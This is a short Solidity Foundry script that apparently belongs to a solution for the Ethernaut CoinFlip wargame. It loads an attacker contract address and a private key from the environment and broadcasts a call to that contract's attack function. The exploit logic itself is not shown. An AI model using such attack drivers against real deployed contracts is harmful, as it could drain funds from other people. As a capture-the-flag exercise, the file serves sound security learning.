// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {CoinFlipAttacker} from "../src/CoinFlipAttacker.sol";
import {IEthernaut} from "../src/IEthernaut.sol";

contract CoinFlipAttack is Script{
  function run() public{
    address coinFlipAddress = vm.envAddress("ATTACKER_CONTRACT");
    CoinFlipAttacker coinFlipAttacker = CoinFlipAttacker(coinFlipAddress);

    uint256 attacker = vm.envUint("PRIVATE_KEY");
    
    // Instantiating attacker contract
    vm.startBroadcast(attacker);
    
    // Attack
    coinFlipAttacker.attack();

    vm.stopBroadcast();
  }
}